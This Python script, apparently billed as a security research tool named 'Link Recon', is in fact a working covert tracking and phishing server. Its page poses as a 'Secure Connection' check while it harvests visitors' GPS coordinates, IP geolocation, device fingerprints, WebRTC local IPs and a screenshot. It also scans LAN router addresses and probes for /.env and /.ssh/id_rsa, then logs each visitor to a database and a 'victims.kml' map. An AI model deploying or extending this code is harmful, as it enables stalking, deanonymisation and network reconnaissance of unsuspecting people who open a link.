#!/usr/bin/env python3
"""
===============================================================================
                    LINK RECON - ADVANCED RECONNAISSANCE TOOL
===============================================================================
    A comprehensive information gathering tool for security research.
    
    Usage:
        python infogather.py                    # Run with defaults
        python infogather.py --port 8080        # Custom port
        python infogather.py --https            # Enable HTTPS
        
    Author: Security Research Team
    Version: 2.0.0
===============================================================================
"""

import http.server
import socketserver
import ssl
import json
import os
import base64
import sqlite3
import csv
import hashlib
import secrets
import threading
import time
import argparse
from datetime import datetime
from typing import Dict, List
from dataclasses import dataclass

# ============================================================================
#                               CONFIGURATION
# ============================================================================

@dataclass
class Config:
    host: str = "0.0.0.0"
    port: int = 5000
    use_https: bool = False
    cert_file: str = "cert.pem"
    key_file: str = "key.pem"
    rate_limit: int = 100
    screenshot_full_page: bool = True
    lan_scan_timeout: float = 1.0
    lan_scan_range: List[str] = None
    file_probes: List[str] = None
    geo_apis: List[str] = None
    enable_gps: bool = True  # Enable HTML5 GPS geolocation
    gps_timeout: float = 10.0  # GPS request timeout
    gps_accuracy_threshold: float = 100  # Minimum accuracy in meters
    output_dir: str = "reports"
    export_json: bool = True
    export_csv: bool = True
    export_sqlite: bool = True
    enable_dashboard: bool = True
    
    def __post_init__(self):
        if self.lan_scan_range is None:
            self.lan_scan_range = ["192.168.1.1", "10.0.0.1", "192.168.0.1", "172.16.0.1"]
        if self.file_probes is None:
            self.file_probes = ["/robots.txt", "/.env", "/.git/config", "/.ssh/id_rsa"]
        if self.geo_apis is None:
            self.geo_apis = ["https://ipinfo.io/json", "https://ipapi.co/json/"]
    
    def load_from_file(self, path: str) -> 'Config':
        if os.path.exists(path):
            with open(path, 'r') as f:
                data = json.load(f)
                for k, v in data.items():
                    if hasattr(self, k):
                        setattr(self, k, v)
        return self


# ============================================================================
#                               GLOBAL STATE
# ============================================================================

config = Config()
_db = None
_exporter = None
_kml_path = "victims.kml"
_logs_file = None

def log_print(*args, **kwargs):
    """Print with timestamp."""
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}]", *args, **kwargs)


def log_file(*args, **kwargs):
    """Log to file."""
    if _logs_file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            with open(_logs_file, 'a') as f:
                f.write(f"[{timestamp}] " + " ".join(str(a) for a in args) + "\n")
        except:
            pass


def log(*args, **kwargs):
    """Log to both console and file."""
    log_print(*args, **kwargs)
    log_file(*args, **kwargs)


def init_globals():
    """Initialize global variables."""
    global _db, _exporter, _kml_path, _logs_file
    os.makedirs(config.output_dir, exist_ok=True)
    _logs_file = os.path.join(config.output_dir, "link_recon.log")
    _db_path = os.path.join(config.output_dir, "recon_data.db")
    _db = sqlite3.connect(_db_path, check_same_thread=False)
    _init_db()
    _exporter = DataExporterClass(config.output_dir)
    _kml_path = os.path.join(config.output_dir, "victims.kml")
    log(f"Global state initialized. Output: {config.output_dir}")


def _init_db():
    """Initialize database schema."""
    cursor = _db.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS reports (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            report_id TEXT UNIQUE,
            timestamp TEXT,
            client_ip TEXT,
            city TEXT,
            country TEXT,
            latitude REAL,
            longitude REAL,
            gps_latitude REAL,
            gps_longitude REAL,
            gps_accuracy REAL,
            gps_altitude REAL,
            user_agent TEXT,
            os_platform TEXT,
            screen_res TEXT,
            timezone TEXT,
            local_ips TEXT,
            lan_scan TEXT,
            file_probes TEXT,
            network_type TEXT,
            data_hash TEXT,
            raw_json TEXT
        )
    ''')
    _db.commit()


# ============================================================================
#                               DATA EXPORTER
# ============================================================================

class DataExporterClass:
    def __init__(self, output_dir: str):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        os.makedirs(os.path.join(output_dir, "screenshots"), exist_ok=True)
    
    def export_json(self, report_id: str, data: Dict) -> str:
        path = os.path.join(self.output_dir, f"{report_id}.json")
        with open(path, 'w', encoding='utf-8') as f:
            json.dump({'report_id': report_id, 'timestamp': datetime.now().isoformat(), 'data': data}, f, indent=2)
        return path
    
    def export_csv(self, report_id: str, data: Dict) -> str:
        path = os.path.join(self.output_dir, f"{report_id}.csv")
        ip_info = data.get('ipInfo', {})
        fields = ['report_id', 'timestamp', 'ip', 'city', 'country', 'os', 'browser', 'screen', 'timezone']
        row = {
            'report_id': report_id,
            'timestamp': data.get('timestamp', ''),
            'ip': ip_info.get('ip', ''),
            'city': ip_info.get('city', ''),
            'country': ip_info.get('country', ''),
            'os': data.get('platform', ''),
            'browser': (data.get('userAgent', '') or '')[:100],
            'screen': data.get('screen', ''),
            'timezone': data.get('timezone', '')
        }
        write_header = not os.path.exists(path)
        with open(path, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=fields)
            if write_header:
                writer.writeheader()
            writer.writerow(row)
        return path
    
    def save_screenshot(self, report_id: str, screenshot_data: str):
        try:
            if ',' in screenshot_data:
                img_data = screenshot_data.split(',')[1]
                path = os.path.join(self.output_dir, "screenshots", f"{report_id}.png")
                with open(path, "wb") as f:
                    f.write(base64.b64decode(img_data))
        except Exception as e:
            log(f"Screenshot save failed: {e}")


# ============================================================================
#                               RATE LIMITER
# ============================================================================

class RateLimiter:
    def __init__(self, limit: int = 100):
        self.limit = limit
        self.requests = {}
        self.lock = threading.Lock()
    
    def is_allowed(self, client_ip: str) -> bool:
        now = time.time()
        minute_ago = now - 60
        
        with self.lock:
            if client_ip not in self.requests:
                self.requests[client_ip] = []
            self.requests[client_ip] = [t for t in self.requests[client_ip] if t > minute_ago]
            if len(self.requests[client_ip]) >= self.limit:
                return False
            self.requests[client_ip].append(now)
            return True


rate_limiter = RateLimiter()


# ============================================================================
#                               KML GENERATOR
# ============================================================================

def update_kml(ip_info: Dict, gps_data: Dict = None):
    """Add placemark to KML file with GPS support."""
    global _kml_path
    try:
        # Use GPS data if available and accurate, otherwise fall back to IP geolocation
        if gps_data and gps_data.get('gps_lat') and gps_data.get('gps_accuracy', 999) < 100:
            lat = gps_data['gps_lat']
            lon = gps_data['gps_lon']
            accuracy = gps_data.get('gps_accuracy', 0)
            source = f"GPS (accuracy: {accuracy}m)"
        else:
            loc = ip_info.get('loc', '')
            if not loc or 'N/A' in loc:
                return
            lat, lon = loc.split(',')
            source = "IP Geolocation"
        
        ip = ip_info.get('ip', 'Unknown')
        city = ip_info.get('city', 'N/A')
        country = ip_info.get('country', 'N/A')
        
        is_new = not os.path.exists(_kml_path)
        with open(_kml_path, 'a') as f:
            if is_new:
                f.write('<?xml version="1.0" encoding="UTF-8"?>\n<kml xmlns="http://www.opengis.net/kml/2.2">\n<Document>\n<name>Targets</name>\n')
            f.write(f'<Placemark><name>{ip}</name><description>{city}, {country} ({source})</description><Point><coordinates>{lon},{lat},0</coordinates></Point></Placemark>\n')
        log(f"KML updated: {ip} ({source})")
    except Exception as e:
        log(f"KML update failed: {e}")


# ============================================================================
#                               DETAILED HARVEST LOGGING
# ============================================================================

def log_harvest(data: Dict, ip_info: Dict, report_id: str, gps_data: Dict = None):
    """Log detailed harvest information to console."""
    log("")
    log("=" * 70)
    log("  TARGET HIT - DETAILED HARVEST REPORT")
    log("=" * 70)
    log(f"  Report ID:     {report_id}")
    log(f"  Timestamp:     {data.get('timestamp', 'N/A')}")
    log("-" * 70)
    
    # GPS Precise Location (if available)
    if gps_data and gps_data.get('gps_lat'):
        log("  [PRECISE GPS LOCATION]")
        log(f"    Latitude:     {gps_data.get('gps_lat', 'N/A')}")
        log(f"    Longitude:    {gps_data.get('gps_lon', 'N/A')}")
        log(f"    Accuracy:     {gps_data.get('gps_accuracy', 'N/A')}m")
        if gps_data.get('gps_altitude'):
            log(f"    Altitude:     {gps_data.get('gps_altitude', 'N/A')}m")
        log("")
    
    # IP & Location
    log("  [IP GEOLOCATION]")
    log(f"    Public IP:    {ip_info.get('ip', 'N/A')}")
    log(f"    City:         {ip_info.get('city', 'N/A')}")
    log(f"    Region:       {ip_info.get('region', 'N/A')}")
    log(f"    Country:      {ip_info.get('country', 'N/A')}")
    log(f"    Coordinates:  {ip_info.get('loc', 'N/A')}")
    log(f"    ISP:          {ip_info.get('org', 'N/A')}")
    if ip_info.get('googleMaps'):
        log(f"    Google Maps: {ip_info.get('googleMaps')}")
    log("")
    
    # Device Info
    log("  [DEVICE INFORMATION]")
    log(f"    OS:           {data.get('platform', 'N/A')}")
    log(f"    Browser:      {data.get('userAgent', 'N/A')[:80]}...")
    log(f"    Screen:       {data.get('screen', 'N/A')}")
    log(f"    Viewport:     {data.get('viewport', 'N/A')}")
    log(f"    Language:     {data.get('language', 'N/A')}")
    log(f"    Timezone:     {data.get('timezone', 'N/A')}")
    log(f"    WebGL:         {data.get('hasWebGL', 'N/A')}")
    log(f"    Online:        {data.get('online', 'N/A')}")
    log("")
    
    # Network Info
    log("  [NETWORK DETECTION]")
    log(f"    Network:      {data.get('networkType', 'N/A')}")
    log(f"    Latency:      {data.get('rtt', 'N/A')} ms")
    log(f"    Local IPs:    {', '.join(data.get('localIps', ['N/A']))}")
    log("")
    
    # LAN Scan
    log("  [LAN SCAN RESULTS]")
    for host, status in data.get('lanScan', {}).items():
        status_icon = "[OK]" if status == "reachable" else "[X]"
        log(f"    {status_icon} {host} -> {status}")
    log("")
    
    # File Probes
    log("  [FILE SYSTEM PROBES]")
    for path, status in data.get('fileHints', {}).items():
        status_icon = "[FOUND]" if status == "exists" else "[X]"
        log(f"    {status_icon} {path}")
    log("")
    
    log("  [DATA SAVED]")
    log(f"    JSON:         {config.output_dir}/{report_id}.json")
    log(f"    CSV:          {config.output_dir}/{report_id}.csv")
    log(f"    Screenshot:   {config.output_dir}/screenshots/{report_id}.png")
    log(f"    Database:     {config.output_dir}/recon_data.db")
    log(f"    KML Map:      {config.output_dir}/victims.kml")
    log("")
    log("=" * 70)


# ============================================================================
#                               HTTP HANDLER
# ============================================================================

class ReconHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        log(f"{self.client_address[0]} - {format % args}")
    
    def do_GET(self):
        if not rate_limiter.is_allowed(self.client_address[0]):
            self.send_error(429, "Too Many Requests")
            return
        
        if self.path == '/':
            self.serve_recon_page()
        elif self.path == '/dashboard':
            self.serve_dashboard()
        elif self.path == '/favicon.ico':
            self.send_error(204)
        else:
            super().do_GET()
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            
            try:
                data = json.loads(body)
            except:
                data = {"error": "parse_failed"}
            
            report_id = secrets.token_hex(16)
            data['report_id'] = report_id
            
            # Process data
            ip_info = data.get('ipInfo', {})
            gps_data = data.get('gpsData', {})  # Extract GPS data
            
            # Update KML with GPS support
            if ip_info:
                update_kml(ip_info, gps_data)
            
            # Save to database
            if _db:
                try:
                    cursor = _db.cursor()
                    local_ips = json.dumps(data.get('localIps', []))
                    lan_scan = json.dumps(data.get('lanScan', {}))
                    file_probes = json.dumps(data.get('fileHints', {}))
                    raw_json = json.dumps(data)
                    data_hash = hashlib.sha256(raw_json.encode()).hexdigest()
                    
                    cursor.execute('''
                        INSERT OR REPLACE INTO reports VALUES (
                            ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 
                            ?, ?, ?, ?, ?, ?, ?
                        )
                    ''', (
                        None, report_id, data.get('timestamp', datetime.now().isoformat()),
                        ip_info.get('ip', 'unknown'), ip_info.get('city', 'N/A'), ip_info.get('country', 'N/A'),
                        ip_info.get('loc', '0,0').split(',')[0] if ip_info.get('loc') else 0,
                        ip_info.get('loc', '0,0').split(',')[1] if ip_info.get('loc') else 0,
                        # GPS fields
                        gps_data.get('gps_lat', 0),
                        gps_data.get('gps_lon', 0),
                        gps_data.get('gps_accuracy', 0),
                        gps_data.get('gps_altitude', 0),
                        # Remaining fields
                        (data.get('userAgent', '') or '')[:500], data.get('platform', 'unknown'),
                        data.get('screen', 'unknown'), data.get('timezone', 'unknown'),
                        local_ips, lan_scan, file_probes,
                        data.get('networkType', 'unknown'), data_hash, raw_json
                    ))
                    _db.commit()
                except Exception as e:
                    log(f"DB save failed: {e}")
            
            # Export files
            if _exporter:
                try:
                    if config.export_json:
                        _exporter.export_json(report_id, data)
                    if config.export_csv:
                        _exporter.export_csv(report_id, data)
                    if data.get('screenshot'):
                        _exporter.save_screenshot(report_id, data['screenshot'])
                except Exception as e:
                    log(f"Export failed: {e}")
            
            # Log detailed harvest
            log_harvest(data, ip_info, report_id, gps_data)
            
            self.send_response(201)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success", "report_id": report_id}).encode())
            
        except Exception as e:
            log(f"POST error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def serve_recon_page(self):
        """Serve the reconnaissance page."""
        html = f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Connection</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }}
        .container {{
            text-align: center;
            padding: 50px;
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }}
        .loader {{
            width: 80px;
            height: 80px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid #4CAF50;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }}
        @keyframes spin {{ 0% {{transform:rotate(0deg)}} 100% {{transform:rotate(360deg)}} }}
        h1 {{ margin-bottom: 15px; }}
        p {{ color: rgba(255,255,255,0.8); }}
        .checkmark {{ display:none; font-size:60px; color:#4CAF50; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="checkmark" id="ck">✓</div>
        <div class="loader" id="sp"></div>
        <h1 id="ti">Securing Your Connection</h1>
        <p id="msg">Please wait while we verify your session...</p>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
    <script>
        setTimeout(() => {{
            document.getElementById('sp').style.display='none';
            document.getElementById('ck').style.display='block';
            document.getElementById('ti').innerText='Session Secured';
            document.getElementById('msg').innerText='You may close this window.';
            collectAndSend();
        }}, 5000);
        
        async function collectAndSend() {{
            const data = {{
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: screen.width+'x'+screen.height,
                viewport: [window.innerWidth, window.innerHeight],
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hasWebGL: !!document.createElement('canvas').getContext('webgl'),
                online: navigator.onLine,
                networkType: navigator.connection?.effectiveType||'unknown',
                rtt: navigator.connection?.rtt||'N/A',
                localIps: await getLocalIps(),
                ipInfo: await getPublicIp(),
                gpsData: await getGPSLocation(),
                lanScan: await scanLAN(),
                fileHints: await probeFiles()
            }};
            
            if(window.html2canvas) {{
                const c=await html2canvas(document.body,{{scale:1,backgroundColor:'#1a1a2e'}});
                data.screenshot=c.toDataURL('image/png');
            }}
            
            fetch('/log',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(data)}}).catch(()=>{{}});
        }}
        
        // GPS Location Function - Uses HTML5 Geolocation API
        async function getGPSLocation() {{
            return new Promise(resolve => {{
                // Always return gpsData field, even if GPS fails
                const defaultResult = {{
                    gps_lat: null,
                    gps_lon: null,
                    gps_accuracy: null,
                    gps_altitude: null,
                    gps_error: 'not_requested'
                }};
                
                if (!navigator.geolocation) {{
                    console.log('Geolocation not supported');
                    resolve(defaultResult);
                    return;
                }}
                
                const options = {{
                    enableHighAccuracy: true,
                    timeout: {int(config.gps_timeout * 1000)},
                    maximumAge: 0
                }};
                
                console.log('Requesting GPS location...');
                navigator.geolocation.getCurrentPosition(
                    (pos) => {{
                        const acc = pos.coords.accuracy;
                        console.log(`GPS Location: ${{pos.coords.latitude}}, ${{pos.coords.longitude}} (accuracy: ${{acc}}m)`);
                        resolve({{
                            gps_lat: pos.coords.latitude,
                            gps_lon: pos.coords.longitude,
                            gps_accuracy: pos.coords.accuracy,
                            gps_altitude: pos.coords.altitude || null,
                            gps_altitude_accuracy: pos.coords.altitudeAccuracy || null,
                            gps_heading: pos.coords.heading || null,
                            gps_speed: pos.coords.speed || null,
                            gps_timestamp: pos.timestamp,
                            gps_error: null
                        }});
                    }},
                    (error) => {{
                        console.log(`GPS Error: ${{error.message}} (code: ${{error.code}})`);
                        resolve({{
                            gps_lat: null,
                            gps_lon: null,
                            gps_accuracy: null,
                            gps_altitude: null,
                            gps_error: error.message,
                            gps_error_code: error.code
                        }});
                    }},
                    options
                );
            }});
        }}
        
        function getLocalIps() {{
            return new Promise(resolve => {{
                const pc=new RTCPeerConnection({{iceServers:[]}});
                const ips=[];
                pc.onicecandidate=e => {{
                    if(e.candidate){{const ip=e.candidate.address;if(ip&&!ips.includes(ip)&&ip!=='127.0.0.1')ips.push(ip);}}
                    else{{resolve(ips.length?ips:['none']);}}
                }};
                pc.createDataChannel('');
                pc.createOffer().then(o=>pc.setLocalDescription(o));
                setTimeout(()=>resolve(ips),{int(config.lan_scan_timeout*1000)});
            }});
        }}
        
        async function getPublicIp() {{
            const apis={json.dumps(config.geo_apis)};
            for(const api of apis){{
                try{{
                    const r=await fetch(api);
                    const d=await r.json();
                    if(d.ip){{if(d.loc)d.googleMaps=`https://www.google.com/maps?q=${{d.loc}}`;return d;}}
                }}catch(e){{continue;}}
            }}
            return{{ip:'unknown',city:'N/A',country:'N/A',loc:'0,0'}};
        }}
        
        async function scanLAN() {{
            const hosts={json.dumps(config.lan_scan_range)};
            const results={{}};
            const ps=hosts.map(h=>fetch(`http://${{h}}`,{{mode:'no-cors',signal:AbortSignal.timeout({int(config.lan_scan_timeout*1000)})}})
                .then(()=>results[h]='reachable').catch(()=>results[h]='timeout'));
            await Promise.allSettled(ps);
            return results;
        }}
        
        async function probeFiles() {{
            const files={json.dumps(config.file_probes)};
            const results={{}};
            for(const f of files){{
                results[f]=await fetch(f,{{method:'HEAD',mode:'no-cors'}}).then(()=>'exists').catch(()=>'not found');
            }}
            return results;
        }}
    </script>
</body>
</html>
'''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def serve_dashboard(self):
        """Serve dashboard with statistics."""
        stats = {'total': 0, 'countries': {}, 'platforms': {}}
        if _db:
            try:
                cursor = _db.cursor()
                cursor.execute("SELECT COUNT(*) FROM reports")
                stats['total'] = cursor.fetchone()[0]
                cursor.execute("SELECT country, COUNT(*) FROM reports GROUP BY country LIMIT 5")
                stats['countries'] = dict(cursor.fetchall())
                cursor.execute("SELECT os_platform, COUNT(*) FROM reports GROUP BY os_platform LIMIT 5")
                stats['platforms'] = dict(cursor.fetchall())
            except:
                pass
        
        html = f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="30">
    <title>Dashboard</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ font-family:'Segoe UI'; background:#1a1a2e; color:white; padding:20px; }}
        .header {{ background:linear-gradient(135deg,#667eea,#764ba2); padding:30px; border-radius:15px; margin-bottom:25px; }}
        .stats {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:20px; }}
        .card {{ background:rgba(255,255,255,0.1); padding:25px; border-radius:12px; text-align:center; }}
        .card h3 {{ color:#667eea; font-size:2.5em; margin-bottom:10px; }}
        table {{ width:100%; border-collapse:collapse; margin-top:20px; }}
        th,td {{ padding:12px; text-align:left; border-bottom:1px solid rgba(255,255,255,0.1); }}
        th {{ color:#667eea; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Link Recon Dashboard</h1>
        <p>Updated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
    </div>
    <div class="stats">
        <div class="card"><h3>{stats['total']}</h3><p>Total Reports</p></div>
    </div>
    <div class="card" style="margin-top:20px;">
        <h2>Top Countries</h2>
        <table><tr><th>Country</th><th>Count</th></tr>
        {''.join(f'<tr><td>{c}</td><td>{cnt}</td></tr>' for c,cnt in stats['countries'].items())}
        </table>
    </div>
</body>
</html>
'''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())


# ============================================================================
#                               THREADED SERVER
# ============================================================================

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


# ============================================================================
#                               MAIN
# ============================================================================

def generate_cert():
    """Generate self-signed certificate."""
    try:
        import subprocess
        subprocess.run(['openssl', 'req', '-x509', '-newkey', 'rsa:2048', '-keyout', 'key.pem', '-out', 'cert.pem', '-days', '365', '-nodes', '-subj', '/CN=localhost'], check=True, capture_output=True)
        log("Certificate generated: cert.pem, key.pem")
    except Exception as e:
        log(f"Certificate generation failed: {e}")


def parse_args():
    parser = argparse.ArgumentParser(description='Link Recon - Information Gathering Tool')
    parser.add_argument('--host', default='0.0.0.0')
    parser.add_argument('--port', type=int, default=5000)
    parser.add_argument('--https', action='store_true')
    parser.add_argument('--cert', default='cert.pem')
    parser.add_argument('--key', default='key.pem')
    parser.add_argument('--config', help='Config file path')
    parser.add_argument('--output', default='reports')
    parser.add_argument('--no-dashboard', action='store_true')
    return parser.parse_args()


def main():
    global config
    
    args = parse_args()
    config.host = args.host
    config.port = args.port
    config.use_https = args.https
    config.cert_file = args.cert
    config.key_file = args.key
    config.output_dir = args.output
    config.enable_dashboard = not args.no_dashboard
    
    if args.config:
        config.load_from_file(args.config)
    
    # Initialize
    init_globals()
    
    if config.use_https and not (os.path.exists(config.cert_file) and os.path.exists(config.key_file)):
        generate_cert()
    
    # Create server
    try:
        if config.use_https and os.path.exists(config.cert_file) and os.path.exists(config.key_file):
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(config.cert_file, config.key_file)
            server = ThreadedTCPServer((config.host, config.port), ReconHandler)
            server.socket = ctx.wrap_socket(server.socket, server_side=True)
            log(f"HTTPS Server started: https://{config.host}:{config.port}")
        else:
            server = ThreadedTCPServer((config.host, config.port), ReconHandler)
            log(f"HTTP Server started: http://{config.host}:{config.port}")
        
        if config.enable_dashboard:
            log(f"Dashboard: http://{config.host}:{config.port}/dashboard")
        
        log("")
        log("=" * 60)
        log("  LINK RECON v2.0 - Ready")
        log("=" * 60)
        log("")
        log("Press Ctrl+C to stop")
        log("")
        
        server.serve_forever()
    except KeyboardInterrupt:
        log("")
        log("Stopping server...")
    finally:
        if _db:
            _db.close()
        log("Done.")


if __name__ == "__main__":
    main()
